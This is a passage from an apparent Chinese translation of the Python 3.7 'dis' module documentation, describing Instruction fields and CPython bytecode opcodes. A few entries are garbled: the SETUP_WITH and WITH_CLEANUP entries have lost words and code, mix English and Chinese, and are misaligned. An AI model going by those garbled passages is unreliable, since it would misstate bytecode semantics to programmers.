<code>对。请参阅 :source:</code>objects/lnotab_notes.txt<code> ，了解 ``co_lnotab</code> 格式以及如何解码它。<em>在 3.6 版更改:</em> 行号可能会减少。 以前，他们总是在增加。</p></li><li><p><code>dis.findlabels</code>(<em>code</em>)</p><p>检测作为跳转目标的原始编译后字节码字符串 <em>code</em> 中的所有偏移量，并返回这些偏移量的列表。</p></li><li><p><code>dis.stack_effect</code>(<em>opcode</em>[, <em>oparg</em>])</p><p>使用参数 <em>oparg</em> 计算 <em>opcode</em> 的堆栈效果。<em>3.4 新版功能.</em></p></li></ul><h2 id="Python字节码说明">Python字节码说明</h2><p><a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.get_instructions"><code>get_instructions()</code></a> 函数和 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.Bytecode"><code>Bytecode</code></a> 类提供字节码指令的详细信息的 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.Instruction"><code>Instruction</code></a> 实例：</p><ul><li><p><em>class</em> <code>dis.Instruction</code></p><p>字节码操作的详细信息<code>opcode</code>操作的数字代码，对应于下面列出的操作码值和 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-collections">操作码集合</a> 中的字节码值。<code>opname</code>人类可读的操作名称<code>arg</code>操作的数字参数（如果有的话），否则为 <code>None</code></p><p><code>argval</code>已解析的 arg 值（如果已知），否则与 arg 相同<code>argrepr</code>人类可读的操作参数描述<code>offset</code>在字节码序列中启动操作索引<code>starts_line</code>行由此操作码（如果有）启动，否则为 <code>Noneis_jump_target</code>如果其他代码跳到这里，则为 <code>True</code> ，否则为 <code>False</code><em>3.4 新版功能.</em></p></li></ul><p>Python编译器当前生成以下字节码指令。</p><p><strong>一般指令</strong></p><ul><li><p><code>NOP</code></p><p>什么都不做。 用作字节码优化器的占位符。</p></li><li><p><code>POP_TOP</code></p><p>删除堆栈顶部（TOS）项。</p></li><li><p><code>ROT_TWO</code></p><p>交换两个最顶层的堆栈项。</p></li><li><p><code>ROT_THREE</code></p><p>将第二个和第三个堆栈项向上提升一个位置，顶项移动到位置三。</p></li><li><p><code>DUP_TOP</code></p><p>复制堆栈顶部的引用。<em>3.2 新版功能.</em></p></li><li><p><code>DUP_TOP_TWO</code></p><p>复制堆栈顶部的两个引用，使它们保持相同的顺序。<em>3.2 新版功能.</em></p></li></ul><p><strong>一元操作</strong></p><p>一元操作获取堆栈顶部元素，应用操作，并将结果推回堆栈。</p><ul><li><p><code>UNARY_POSITIVE</code></p><p>实现 <code>TOS = +TOS</code> 。</p></li><li><p><code>UNARY_NEGATIVE</code></p><p>实现 <code>TOS = -TOS</code> 。</p></li><li><p><code>UNARY_NOT</code></p><p>实现 <code>TOS = not TOS</code> 。</p></li><li><p><code>UNARY_INVERT</code></p><p>实现 <code>TOS = ~TOS</code> 。</p></li><li><p><code>GET_ITER</code></p><p>实现 <code>TOS = iter(TOS)</code> 。</p></li><li><p><code>GET_YIELD_FROM_ITER</code></p><p>如果 <code>TOS</code> 是一个 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-generator-iterator">generator iterator</a> 或 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-coroutine">coroutine</a> 对象则保持原样。否则实现 <code>TOS = iter(TOS)</code> 。<em>3.5 新版功能.</em></p></li></ul><p><strong>二元操作</strong></p><p>二元操作从堆栈中删除堆栈顶部（TOS）和第二个最顶层堆栈项（TOS1）。 它们执行操作，并将结果放回堆栈。</p><ul><li><p><code>BINARY_POWER</code></p><p>实现 <code>TOS = TOS1 ** TOS</code> 。</p></li><li><p><code>BINARY_MULTIPLY</code></p><p>实现 <code>TOS = TOS1 * TOS</code> 。</p></li><li><p><code>BINARY_MATRIX_MULTIPLY</code></p><p>实现 <code>TOS = TOS1 @ TOS</code> 。<em>3.5 新版功能.</em></p></li><li><p><code>BINARY_FLOOR_DIVIDE</code></p><p>实现 <code>TOS = TOS1 // TOS</code>。</p></li><li><p><code>BINARY_TRUE_DIVIDE</code></p><p>实现 <code>TOS = TOS1 / TOS</code> 。</p></li><li><p><code>BINARY_MODULO</code></p><p>实现 <code>TOS = TOS1 % TOS</code> 。</p></li><li><p><code>BINARY_ADD</code></p><p>实现 <code>TOS = TOS1 + TOS</code> 。</p></li><li><p><code>BINARY_SUBTRACT</code></p><p>实现 <code>TOS = TOS1 - TOS</code> 。</p></li><li><p><code>BINARY_SUBSCR</code></p><p>实现 <code>TOS = TOS1[TOS]</code> 。</p></li><li><p><code>BINARY_LSHIFT</code></p><p>实现 <code>TOS = TOS1 &lt;&lt; TOS</code> 。</p></li><li><p><code>BINARY_RSHIFT</code></p><p>实现 <code>TOS = TOS1 &gt;&gt; TOS</code> 。</p></li><li><p><code>BINARY_AND</code></p><p>实现 <code>TOS = TOS1 &amp; TOS</code> 。</p></li><li><p><code>BINARY_XOR</code></p><p>实现 <code>TOS = TOS1 ^ TOS</code> 。</p></li><li><p><code>BINARY_OR</code></p><p>实现 <code>TOS = TOS1 | TOS</code> 。</p></li></ul><p><strong>就地操作</strong></p><p>就地操作就像二元操作，因为它们删除了TOS和TOS1，并将结果推回到堆栈上，但是当TOS1支持它时，操作就地完成，并且产生的TOS可能是（但不一定） 原来的TOS1。</p><ul><li><p><code>INPLACE_POWER</code></p><p>就地实现 <code>TOS = TOS1 ** TOS</code> 。</p></li><li><p><code>INPLACE_MULTIPLY</code></p><p>就地实现 <code>TOS = TOS1 * TOS</code> 。</p></li><li><p><code>INPLACE_MATRIX_MULTIPLY</code></p><p>就地实现 <code>TOS = TOS1 @ TOS</code> 。<em>3.5 新版功能.</em></p></li><li><p><code>INPLACE_FLOOR_DIVIDE</code></p><p>就地实现 <code>TOS = TOS1 // TOS</code> 。</p></li><li><p><code>INPLACE_TRUE_DIVIDE</code></p><p>就地实现 <code>TOS = TOS1 / TOS</code> 。</p></li><li><p><code>INPLACE_MODULO</code></p><p>就地实现 <code>TOS = TOS1 % TOS</code> 。</p></li><li><p><code>INPLACE_ADD</code></p><p>就地实现 <code>TOS = TOS1 + TOS</code> 。</p></li><li><p><code>INPLACE_SUBTRACT</code></p><p>就地实现 <code>TOS = TOS1 - TOS</code> 。</p></li><li><p><code>INPLACE_LSHIFT</code></p><p>就地实现 <code>TOS = TOS1 &lt;&lt; TOS</code> 。</p></li><li><p><code>INPLACE_RSHIFT</code></p><p>就地实现 <code>TOS = TOS1 &gt;&gt; TOS</code> 。</p></li><li><p><code>INPLACE_AND</code></p><p>就地实现 <code>TOS = TOS1 &amp; TOS</code> 。</p></li><li><p><code>INPLACE_XOR</code></p><p>就地实现 <code>TOS = TOS1 ^ TOS</code> 。</p></li><li><p><code>INPLACE_OR</code></p><p>就地实现 <code>TOS = TOS1 | TOS</code> 。</p></li><li><p><code>STORE_SUBSCR</code></p><p>实现 <code>TOS1[TOS] = TOS2</code> 。</p></li><li><p><code>DELETE_SUBSCR</code></p><p>实现 <code>del TOS1[TOS]</code> 。</p></li></ul><p><strong>协程操作码</strong></p><ul><li><p><code>GET_AWAITABLE</code></p><p>实现 <code>TOS = get_awaitable(TOS)</code> ，其中 <code>get_awaitable(o)</code> 返回 <code>o</code> 如果 <code>o</code> 是一个有 CO_ITERABLE_COROUTINE 标志的协程对象或生成器对象，否则解析 <code>o.__await__</code> 。<em>3.5 新版功能.</em></p></li><li><p><code>GET_AITER</code></p><p>实现 <code>TOS = TOS.__aiter__()</code> 。*3.5 新版功能.*<em>在 3.7 版更改:</em> 已经不再支持从 <code>__aiter__</code> 返回可等待对象。</p></li><li><p><code>GET_ANEXT</code></p><p>实现 <code>PUSH(get_awaitable(TOS.__anext__()))</code> 。参见 <code>GET_AWAITABLE</code> 获取更多 <code>get_awaitable</code> 的细节<em>3.5 新版功能.</em></p></li><li><p><code>BEFORE_ASYNC_WITH</code></p><p>从栈顶元素解析 <code>__aenter__</code> 和 <code>__aexit__</code> 。将 <code>__aexit__</code> 和 <code>__aenter__()</code> 的结果推入堆栈。<em>3.5 新版功能.</em></p></li><li><p><code>SETUP_ASYNC_WITH</code></p><p>创建一个新的帧对象。<em>3.5 新版功能.</em></p></li></ul><p><strong>其他操作码</strong></p><ul><li><p><code>PRINT_EXPR</code></p><p>实现交互模式的表达式语句。TOS从堆栈中被移除并打印。在非交互模式下，表达式语句以 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-POP_TOP"><code>POP_TOP</code></a> 终止。</p></li><li><p><code>BREAK_LOOP</code></p><p>Terminates a loop due to a <a href="https://docs.python.org/zh-cn/3.7/reference/simple_stmts.html#break"><code>break</code></a> statement.</p></li><li><p><code>CONTINUE_LOOP</code>(<em>target</em>)</p><p>Continues a loop due to a <a href="https://docs.python.org/zh-cn/3.7/reference/simple_stmts.html#continue"><code>continue</code></a> statement. <em>target</em> is the address to jump to (which should be a <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-FOR_ITER"><code>FOR_ITER</code></a> instruction).</p></li><li><p><code>SET_ADD</code>(<em>i</em>)</p><p>调用 <code>set.add(TOS1[-i], TOS)</code> 。 用于实现集合推导。</p></li><li><p><code>LIST_APPEND</code>(<em>i</em>)</p><p>调用 <code>list.append(TOS[-i], TOS)</code> 。 用于实现列表推导。</p></li><li><p><code>MAP_ADD</code>(<em>i</em>)</p><p>Calls <code>dict.setitem(TOS1[-i], TOS, TOS1)</code>. Used to implement dict comprehensions.<em>3.1 新版功能.</em></p></li></ul><p>对于所有 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-SET_ADD"><code>SET_ADD</code></a> 、 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-LIST_APPEND"><code>LIST_APPEND</code></a> 和 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-MAP_ADD"><code>MAP_ADD</code></a> 指令，当弹出添加的值或键值对时，容器对象保留在堆栈上，以便它可用于循环的进一步迭代。</p><ul><li><p><code>RETURN_VALUE</code></p><p>返回 TOS 到函数的调用者。</p></li><li><p><code>YIELD_VALUE</code></p><p>弹出 TOS 并从一个 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-generator">generator</a> 生成它。</p></li><li><p><code>YIELD_FROM</code></p><p>弹出 TOS 并将其委托给它作为 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-generator">generator</a> 的子迭代器。<em>3.3 新版功能.</em></p></li><li><p><code>SETUP_ANNOTATIONS</code></p><p>检查 <code>__annotations__</code> 是否在 <code>locals()</code> 中定义，如果没有，它被设置为空 <code>dict</code> 。只有在类或模块体静态地包含 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-variable-annotation">variable annotations</a> 时才会发出此操作码。<em>3.6 新版功能.</em></p></li><li><p><code>IMPORT_STAR</code></p><p>将所有不以 <code>'_'</code> 开头的符号直接从模块 TOS 加载到本地名称空间。加载所有名称后弹出该模块。这个操作码实现了 <code>from module import *</code> 。</p></li><li><p><code>POP_BLOCK</code></p><p>Removes one block from the block stack. Per frame, there is a stack of blocks, denoting nested loops, try statements, and such.</p></li><li><p><code>POP_EXCEPT</code></p><p>从块堆栈中删除一个块。 弹出的块必须是异常处理程序块，在进入 except 处理程序时隐式创建。除了从帧堆栈弹出无关值之外，最后三个弹出值还用于恢复异常状态。</p></li><li><p><code>END_FINALLY</code></p><p>Terminates a <a href="https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#finally"><code>finally</code></a> clause. The interpreter recalls whether the exception has to be re-raised, or whether the function returns, and continues with the outer-next block.</p></li><li><p><code>LOAD_BUILD_CLASS</code></p><p>将 <code>builtins .__ build_class__()</code> 推到堆栈上。它之后被 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a> 调用来构造一个类。</p></li><li><p><code>SETUP_WITH</code>(<em>delta</em>)</p><p>此操作码在 with 块开始之前执行几个操作。首先，它<a href="https://docs.python.org//3.7/reference/datamodel.html#object.__exit__"><code>__exit__()</code></a>从上下文管理器中加载并将其推送到堆栈以供<code>WITH_CLEANUP</code>. 然后， 被调用，并 推送<a href="https://docs.python.org//3.7/reference/datamodel.html#object.__enter__"><code>__enter__()</code></a>一个指向*delta的 finally 块。*最后，调用 enter 方法的结果被压入堆栈。下一个操作码要么忽略它（<a href="https://docs.python.org//3.7/library/dis.html#opcode-POP_TOP"><code>POP_TOP</code></a>），要么将它存储在（a）变量（<a href="https://docs.python.org//3.7/library/dis.html#opcode-STORE_FAST"><code>STORE_FAST</code></a>、<a href="https://docs.python.org//3.7/library/dis.html#opcode-STORE_NAME"><code>STORE_NAME</code></a>或 <a href="https://docs.python.org//3.7/library/dis.html#opcode-UNPACK_SEQUENCE"><code>UNPACK_SEQUENCE</code></a>）中。<em>3.2 新版功能.</em></p></li><li><p><code>WITH_CLEANUP_START</code></p><p><a href="https://docs.python.org//3.7/reference/compound_stmts.html#with"><code>with</code></a>当语句块退出时清理堆栈。TOS 是上下文管理器的<a href="https://docs.python.org//3.7/reference/datamodel.html#object.__exit__"><code>__exit__()</code></a>绑定方法。TOS 下面是 1-3 个值，指示如何/为什么输入 finally 子句：</p><p>SECOND = <code>None</code></p><p>(SECOND, THIRD) = (<code>WHY_&#123;RETURN,CONTINUE&#125;</code>), retval</p><p>SECOND = <code>WHY_*</code>; no retval below it</p><p>(SECOND, THIRD, FOURTH) = exc_info()</p><p>In the last case, <code>TOS(SECOND, THIRD, FOURTH)</code> is called, otherwise <code>TOS(None, None, None)</code>. 在最后一种情况下，调用，否则 。将 SECOND 和调用结果压入堆栈。<code>WITH_CLEANUP_FINISH</code></p></li><li><p>Pops exception type and result of ‘exit’ function call from the stack.If the stack represents an exception, <em>and</em> the function call returns a ‘true’ value, this information is “zapped” and replaced with a single <code>WHY_SILENCED</code> to prevent <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-END_FINALLY"><code>END_FINALLY</code></a> from re-raising the exception. (But non-local gotos will still be resumed.)</p></li></ul><p>以下所有操作码均使用其参数。</p><ul><li><p><code>STORE_NAME</code>(<em>namei</em>)</p><p>实现 <code>name = TOS</code>。 <em>namei</em> 是 <em>name</em> 在代码对象的 <code>co_names</code> 属性中的索引。 在可能的情况下，编译器会尝试使用 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-STORE_FAST"><code>STORE_FAST</code></a> 或 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-STORE_GLOBAL"><code>STORE_GLOBAL</code></a>。</p></li><li><p><code>DELETE_NAME</code>(<em>namei</em>)</p><p>实现 <code>del name</code> ，其中 <em>namei</em> 是代码对象的 <code>co_names</code> 属性的索引。</p></li><li><p><code>UNPACK_SEQUENCE</code>(<em>count</em>)</p><p>将 TOS 解包为 <em>count</em> 个单独的值，它们将按从右至左的顺序被放入堆栈。</p></li><li><p><code>UNPACK_EX</code>(<em>counts</em>)</p><p>实现使用带星号的目标进行赋值：将 TOS 中的可迭代对象解包为单独的值，其中值的总数可以小于可迭代对象中的项数：新值之一将是由所有剩余项构成的列表。<em>counts</em> 的低字节是列表值之前的值的数量，<em>counts</em> 中的高字节则是之后的值的数量。 结果值会按从右至左的顺序入栈。</p></li><li><p><code>STORE_ATTR</code>(<em>namei</em>)</p><p>实现 <code>TOS.name = TOS1</code>，其中 <em>namei</em> 是 name 在 <code>co_names</code> 中的索引号。</p></li><li><p><code>DELETE_ATTR</code>(<em>namei</em>)</p><p>实现 <code>del TOS.name</code>，使用 <em>namei</em> 作为 <code>co_names</code> 中的索引号。</p></li><li><p><code>STORE_GLOBAL</code>(<em>namei</em>)</p><p>类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-STORE_NAME"><code>STORE_NAME</code></a> 但会将 name 存储为全局变量。</p></li><li><p><code>DELETE_GLOBAL</code>(<em>namei</em>)</p><p>类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-DELETE_NAME"><code>DELETE_NAME</code></a> 但会删除一个全局变量。</p></li><li><p><code>LOAD_CONST</code>(<em>consti</em>)</p><p>将 <code>co_consts[consti]</code> 推入栈顶。</p></li><li><p><code>LOAD_NAME</code>(<em>namei</em>)</p><p>将与 <code>co_names[namei]</code> 相关联的值推入栈顶。</p></li><li><p><code>BUILD_TUPLE</code>(<em>count</em>)</p><p>创建一个使用了来自栈的 <em>count</em> 个项的元组，并将结果元组推入栈顶。</p></li><li><p><code>BUILD_LIST</code>(<em>count</em>)</p><p>类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_TUPLE"><code>BUILD_TUPLE</code></a> 但会创建一个列表。</p></li><li><p><code>BUILD_SET</code>(<em>count</em>)</p><p>类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_TUPLE"><code>BUILD_TUPLE</code></a> 但会创建一个集合。</p></li><li><p><code>BUILD_MAP</code>(<em>count</em>)</p><p>将一个新字典对象推入栈顶。 弹出 <code>2 * count</code> 项使得字典包含 <em>count</em> 个条目: <code>&#123;..., TOS3: TOS2, TOS1: TOS&#125;</code>。<em>在 3.5 版更改:</em> 字典是根据栈中的项创建而不是创建一个预设大小包含 <em>count</em> 项的空字典。</p></li><li><p><code>BUILD_CONST_KEY_MAP</code>(<em>count</em>)</p><p><a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_MAP"><code>BUILD_MAP</code></a> 版本专用于常量键。 弹出的栈顶元素包含一个由键构成的元组，然后从 <code>TOS1</code> 开始从构建字典的值中弹出 <em>count</em> 个值。<em>3.6 新版功能.</em></p></li><li><p><code>BUILD_STRING</code>(<em>count</em>)</p><p>拼接 <em>count</em> 个来自栈的字符串并将结果字符串推入栈顶。<em>3.6 新版功能.</em></p></li><li><p><code>BUILD_TUPLE_UNPACK</code>(<em>count</em>)</p><p>从栈中弹出 <em>count</em> 个可迭代对象，将它们合并为单个元组，并将结果推入栈顶。 实现可迭代对象解包为元组形式 <code>(*x, *y, *z)</code>。<em>3.5 新版功能.</em></p></li><li><p><code>BUILD_TUPLE_UNPACK_WITH_CALL</code>(<em>count</em>)</p><p>这类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_TUPLE_UNPACK"><code>BUILD_TUPLE_UNPACK</code></a> 但专用于 <code>f(*x, *y, *z)</code> 调用语法。 栈中 <code>count + 1</code> 位置上的项应当是相应的可调用对象 <code>f</code>。<em>3.6 新版功能.</em></p></li><li><p><code>BUILD_LIST_UNPACK</code>(<em>count</em>)</p><p>这类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_TUPLE_UNPACK"><code>BUILD_TUPLE_UNPACK</code></a> 但会将一个列表而非元组推入栈顶。 实现可迭代对象解包为列表形式 <code>[*x, *y, *z]</code>。<em>3.5 新版功能.</em></p></li><li><p><code>BUILD_SET_UNPACK</code>(<em>count</em>)</p><p>这类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_TUPLE_UNPACK"><code>BUILD_TUPLE_UNPACK</code></a> 但会将一个集合而非元组推入栈顶。 实现可迭代对象解包为集合形式 <code>&#123;*x, *y, *z&#125;</code>。<em>3.5 新版功能.</em></p></li><li><p><code>BUILD_MAP_UNPACK</code>(<em>count</em>)</p><p>从栈中弹出 <em>count</em> 个映射对象，将它们合并为单个字典，并将结果推入栈顶。 实现字典解包为字典形式 <code>&#123;**x, **y, **z&#125;</code>。<em>3.5 新版功能.</em></p></li><li><p><code>BUILD_MAP_UNPACK_WITH_CALL</code>(<em>count</em>)</p><p>这类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_MAP_UNPACK"><code>BUILD_MAP_UNPACK</code></a> 但专用于 <code>f(**x, **y, **z)</code> 调用语法。 栈中 <code>count + 2</code> 位置上的项应当是相应的可调用对象 <code>f</code>。*3.5 新版功能.*<em>在 3.6 版更改:</em> 可迭代对象的位置的确定方式是将操作码参数加 2 而不是将其编码到参数的第二个字节。</p></li><li><p><code>LOAD_ATTR</code>(<em>namei</em>)</p><p>将 TOS 替换为 <code>getattr(TOS, co_names[namei])</code>。</p></li><li><p><code>COMPARE_OP</code>(<em>opname</em>)</p><p>执行布尔运算操作。 操作名称可在 <code>cmp_op[opname]</code> 中找到。</p></li><li><p><code>IMPORT_NAME</code>(<em>namei</em>)</p><p>导入模块 <code>co_names[namei]</code>。 会弹出 TOS 和 TOS1 以提供 <em>fromlist</em> 和 <em>level</em> 参数给 <a href="https://docs.python.org/zh-cn/3.7/library/functions.html#__import__"><code>__import__()</code></a>。 模块对象会被推入栈顶。 当前命名空间不受影响：对于一条标准 import 语句，会执行后续的 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-STORE_FAST"><code>STORE_FAST</code></a> 指令来修改命名空间。</p></li><li><p><code>IMPORT_FROM</code>(<em>namei</em>)</p><p>从在 TOS 内找到的模块中加载属性 <code>co_names[namei]</code>。 结果对象会被推入栈顶，以便由后续的 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-STORE_FAST"><code>STORE_FAST</code></a> 指令来保存。</p></li><li><p><code>JUMP_FORWARD</code>(<em>delta</em>)</p><p>将字节码计数器的值增加 <em>delta</em>。</p></li><li><p><code>POP_JUMP_IF_TRUE</code>(<em>target</em>)</p><p>如果 TOS 为真值，则将字节码计数器的值设为 <em>target</em>。 TOS 会被弹出。<em>3.1 新版功能.</em></p></li><li><p><code>POP_JUMP_IF_FALSE</code>(<em>target</em>)</p><p>如果 TOS 为假值，则将字节码计数器的值设为 <em>target</em>。 TOS 会被弹出。<em>3.1 新版功能.</em></p></li><li><p><code>JUMP_IF_TRUE_OR_POP</code>(<em>target</em>)</p><p>如果 TOS 为真值，则将字节码计数器的值设为 <em>target</em> 并将 TOS 留在栈顶。 否则（如 TOS 为假值），TOS 会被弹出。<em>3.1 新版功能.</em></p></li><li><p><code>JUMP_IF_FALSE_OR_POP</code>(<em>target</em>)</p><p>如果 TOS 为假值，则将字节码计数器的值设为 <em>target</em> 并将 TOS 留在栈顶。 否则（如 TOS 为真值），TOS 会被弹出。<em>3.1 新版功能.</em></p></li><li><p><code>JUMP_ABSOLUTE</code>(<em>target</em>)</p><p>将字节码计数器的值设为 <em>target</em>。</p></li><li><p><code>FOR_ITER</code>(<em>delta</em>)</p><p>TOS 是一个 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-iterator">iterator</a>。 可调用它的 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#iterator.__next__"><code>__next__()</code></a> 方法。 如果产生了一个新值，则将其推入栈顶（将迭代器留在其下方）。 如果迭代器提示已耗尽则 TOS 会被弹出，并将字节码计数器的值增加 <em>delta</em>。</p></li><li><p><code>LOAD_GLOBAL</code>(<em>namei</em>)</p><p>加载名称为 <code>co_names[namei]</code> 的全局对象推入栈顶。</p></li><li><p><code>SETUP_LOOP</code>(<em>delta</em>)</p><p>将循环的块推送到块堆栈上。该块跨越当前指令，大小为<em>delta</em>字节。</p></li><li><p><code>SETUP_EXCEPT</code>(<em>delta</em>)</p><p>将 try 块从 try-except 子句推送到块堆栈上。<em>delta</em> 指向第一个 except 块。</p></li><li><p><code>SETUP_FINALLY</code>(<em>delta</em>)</p><p>将 try 块从 try-except 子句推送到块堆栈上。<em>delta</em> 指向 finally 块。</p></li><li><p><code>LOAD_FAST</code>(<em>var_num</em>)</p><p>将指向局部对象 <code>co_varnames[var_num]</code> 的引用推入栈顶。</p></li><li><p><code>STORE_FAST</code>(<em>var_num</em>)</p><p>将 TOS 存放到局部变量 <code>co_varnames[var_num]</code>。</p></li><li><p><code>DELETE_FAST</code>(<em>var_num</em>)</p><p>移除局部对象 <code>co_varnames[var_num]</code>。</p></li><li><p><code>LOAD_CLOSURE</code>(<em>i</em>)</p><p>将一个包含在单元的第 <em>i</em> 个空位中的对单元的引用推入栈顶并释放可用的存储空间。 如果 <em>i</em> 小于 <em>co_cellvars</em> 的长度则变量的名称为 <code>co_cellvars[i]</code>。 否则为 <code>co_freevars[i - len(co_cellvars)]</code>。</p></li><li><p><code>LOAD_DEREF</code>(<em>i</em>)</p><p>加载包含在单元的第 <em>i</em> 个空位中的单元并释放可用的存储空间。 将一个对单元所包含对象的引用推入栈顶。</p></li><li><p><code>LOAD_CLASSDEREF</code>(<em>i</em>)</p><p>类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-LOAD_DEREF"><code>LOAD_DEREF</code></a> 但在查询单元之前会首先检查局部对象字典。 这被用于加载类语句体中的自由变量。<em>3.4 新版功能.</em></p></li><li><p><code>STORE_DEREF</code>(<em>i</em>)</p><p>将 TOS 存放到包含在单元的第 <em>i</em> 个空位中的单元内并释放可用存储空间。</p></li><li><p><code>DELETE_DEREF</code>(<em>i</em>)</p><p>清空包含在单元的第 <em>i</em> 个空位中的单元并释放可用存储空间。 被用于 <a href="https://docs.python.org/zh-cn/3.7/reference/simple_stmts.html#del"><code>del</code></a> 语句。<em>3.2 新版功能.</em></p></li><li><p><code>RAISE_VARARGS</code>(<em>argc</em>)</p><p>使用 <code>raise</code> 语句的 3 种形式之一引发异常，具体形式取决于 <em>argc</em> 的值：0: <code>raise</code> (重新引发之前的异常)1: <code>raise TOS</code> (在 <code>TOS</code> 上引发异常实例或类型)2: <code>raise TOS1 from TOS</code> (在 <code>TOS1</code> 上引发异常实例或类型并将 <code>__cause__</code> 设为 <code>TOS</code>)</p></li><li><p><code>CALL_FUNCTION</code>(<em>argc</em>)</p><p>调用一个可调用对象并传入位置参数。 <em>argc</em> 指明位置参数的数量。 栈顶包含位置参数，其中最右边的参数在最顶端。 在参数之下是一个待调用的可调用对象。 <code>CALL_FUNCTION</code> 会从栈中弹出所有参数以及可调用对象，附带这些参数调用该可调用对象，并将可调用对象所返回的返回值推入栈顶。<em>在 3.6 版更改:</em> 此操作码仅用于附带位置参数的调用。</p></li><li><p><code>CALL_FUNCTION_KW</code>(<em>argc</em>)</p><p>调用一个可调用对象并传入位置参数（如果有的话）和关键字参数。 <em>argc</em> 指明位置参数和关键字参数的总数量。 栈顶元素包含一个关键字参数名称的元组。 在元组之下是根据元组排序的关键字参数。 在关键字参数之下是位置参数，其中最右边的参数在最顶端。 在参数之下是一个待调用的可调用对象。 <code>CALL_FUNCTION_KW</code> 会从栈中弹出所有参数以及可调用对象，附带这些参数调用该可调用对象，并将可调用对象所返回的返回值推入栈顶。<em>在 3.6 版更改:</em> 关键字参数会被打包为一个元组而非字典，<em>argc</em> 指明参数的总数量。</p></li><li><p><code>CALL_FUNCTION_EX</code>(<em>flags</em>)</p><p>调用一个可调用对象并附带位置参数和关键字参数变量集合。 如果设置了 <em>flags</em> 的最低位，则栈顶包含一个由额外关键字参数组成的映射对象。 在该对象之下是一个包含位置参数的可迭代对象和一个待调用的可调用对象。 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_MAP_UNPACK_WITH_CALL"><code>BUILD_MAP_UNPACK_WITH_CALL</code></a> 和 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_TUPLE_UNPACK_WITH_CALL"><code>BUILD_TUPLE_UNPACK_WITH_CALL</code></a> 可用于合并多个映射对象和包含参数的可迭代对象。 在该可调用对象被调用之前，映射对象和可迭代对象会被分别“解包”并将它们的内容分别作为关键字参数和位置参数传入。 <code>CALL_FUNCTION_EX</code> 会从栈中弹出所有参数以及可调用对象，附带这些参数调用该可调用对象，并将可调用对象所返回的返回值推入栈顶。<em>3.6 新版功能.</em></p></li><li><p><code>LOAD_METHOD</code>(<em>namei</em>)</p><p>从 TOS 对象加载一个名为 <code>co_names[namei]</code> 的方法。 TOS 将被弹出。 此字节码可区分两种情况：如果 TOS 有一个名称正确的方法，字节码会将未绑定方法和 TOS 推入栈顶。 TOS 将在调用未绑定方法时被用作 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-CALL_METHOD"><code>CALL_METHOD</code></a> 的第一个参数 (<code>self</code>)。 否则会将 <code>NULL</code> 和属性查找所返回的对象推入栈顶。<em>3.7 新版功能.</em></p></li><li><p><code>CALL_METHOD</code>(<em>argc</em>)</p><p>调用一个方法。 <em>argc</em> 是位置参数的数量。 关键字参数不受支持。 此操作码被设计用于配合 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-LOAD_METHOD"><code>LOAD_METHOD</code></a> 使用。 位置参数放在栈顶。 在它们之下放在栈中的是由 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-LOAD_METHOD"><code>LOAD_METHOD</code></a> 所描述的两个条目（或者是 <code>self</code> 和一个未绑定方法对象，或者是 <code>NULL</code> 和一个任意可调用对象）。 它们会被全部弹出并将返回值推入栈顶。<em>3.7 新版功能.</em></p></li><li><p><code>MAKE_FUNCTION</code>(<em>flags</em>)</p><p>将一个新函数对象推入栈顶。 从底端到顶端，如果参数带有指定的旗标值则所使用的栈必须由这些值组成。<code>0x01</code> 是一个默认值的元组，用于按位置排序的仅限位置形参以及位置或关键字形参<code>0x02</code> 是一个仅限关键字形参的默认值的字典<code>0x04</code> 是一个标注字典<code>0x08</code> 一个包含用于自由变量的单元的元组，生成一个闭包与函数 (在 TOS1) 相关联的代码函数的 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-qualified-name">qualified name</a> (在 TOS)</p></li><li><p><code>BUILD_SLICE</code>(<em>argc</em>)</p><p>将一个切片对象推入栈顶。 <em>argc</em> 必须为 2 或 3。 如果为 2，则推入 <code>slice(TOS1, TOS)</code>；如果为 3，则推入 <code>slice(TOS2, TOS1, TOS)</code>。 请参阅 <a href="https://docs.python.org/zh-cn/3.7/library/functions.html#slice"><code>slice()</code></a> 